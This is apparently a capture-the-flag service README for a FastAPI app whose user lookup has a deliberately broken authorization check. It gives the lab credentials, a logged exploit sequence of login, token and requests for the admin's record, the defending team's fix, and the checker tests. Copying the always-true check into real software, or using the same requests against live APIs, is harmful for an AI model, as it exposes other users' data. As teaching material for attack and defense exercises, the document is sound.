# Service definition:
We have a Docker container that includes an API built with FastAPI, which has access to a PostgreSQL database containing information about the app's users.  

The attacker has information about the API and must use that information to obtain the flag located in the database and let them in his T-Submission machine. 

# Service implementation:


The Docker container includes a FastAPI instance that provides access to a database containing two rows of user information:

- First tuple contains information about the `admin` user, with a random password and a valid flag stored in the `flag` column.  
- The other tuple contains information about the 'user' account, with a password known to attackers: `pasahitz_sekretua`, but it does not contain a valid flag.  

The database cannot be manipulated. In FastAPI, models, schemas, and routes cannot be modified. However, the code executed by the routes can be manipulated, as long as the core logic (login + fetching user data) remains intact.

If any of the above points are not met, SLA points will be deducted. 
 
-Flags: 
    The flags are stored in the database in the `flag` column of the `admin` user's row.

# About exploting:
- The attacker must obtain the access token using the provided credentials and the corresponding API call: `http://{ip}:8008/api/v1/login`. Afterward, they will use the access token to make a request to the API that retrieves user information: `http://{ip}:8008/api/v1/user/user`. The response indicates that the flag is in the `admin` user, so the attacker will then make another request to `http://{ip}:8008/api/v1/user/admin` and obtain the flag.

- The defender needs to modify the behavior of the API call `http://{ip}:8008/api/v1/user/{username}` so that it is only valid if the `username` matches the user in the token.
  
  Attack performed by Team1 against Team 4. 
  Post call http://10.0.0.104:8008/api/v1/login with {'username': 'user', 'password': 'pasahitz_sekretua'} data.
      We obtein access token. Response: {"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyIiwiZXhwIjoxNzM0MzQ3OTgxfQ.zRDWzF6reiVSZ9s8hju9Mif5JP66YYa4bNx8ztv2AkQ","token_type":"bearer"}
  Get call http://10.0.0.104:8008/api/v1/user/user with authorization header
      We obtein the response: 
      {
      "email": "user@tknika.eus",
      "username": "user",
      "id": 2,
      "flag": "No Flag for this user... Maybe for admin;)"
      }
  Get call http://10.0.0.104:8008/api/v1/user/admin with authorization header
      We obtein the response: 
      {
      "email": "admin@tknika.eus",
      "username": "admin",
      "id": 1,
      "flag": "(contains the valid flags)"
      }
  'ssh -i /home/urko/Deskargak/keyak/team2-sshkey root@10.0.1.1'
  nano /root/xxx.flag
    Paste copied flags. 

  Defense performed by Team4
    'ssh root@10.0.0.104'
    docker exec -it besteerabiltzailean /bin/bash
    change the file /app/app/service/user_service.py
        def check_user_is_current_user(username: str, current_user: user_schema.User):
          return True

        to

        def check_user_is_current_user(username: str, current_user: user_schema.User):
          return username == current_user.email or username == current_user.username 
    
     

# Checker checks:
- Ports to reach dockers are open (WEB API:8008)
- APIs logic (login + fetching user data)
- Integrity of all FastAPI files except `/app/app/service/user_service.py`

Checks done: 
- TEAM 1. Stop the container: 'root@debian:~# docker stop besteerabiltzailean_web_1' It works OK, service's status becomes DOWN. 
- TEAM 2. Stop the container: 'root@debian:~# docker stop besteerabiltzailean_db_1' It works OK, service's status becomes FAULTY.
- TEAM 1. Change /app/app/router/user_route.py  file from 'besteerabiltzailean_web_1' docker. It works OK, service's status becomes FAULTY. 
- TEAM 2. Apply fix '/app/app/service/user_service.py' file from 'besteerabiltzailean_web_1' docker. It works OK, service's status doesn't change
- TEAM 1. Make a change that does not affect the logic of the app '/app/app/service/user_service.py' file from 'besteerabiltzailean_web_1' docker. It works OK, service's status doesn't change
 
# License notes
Parts from:
https://github.com/Tknika/ctf-gameserver-services


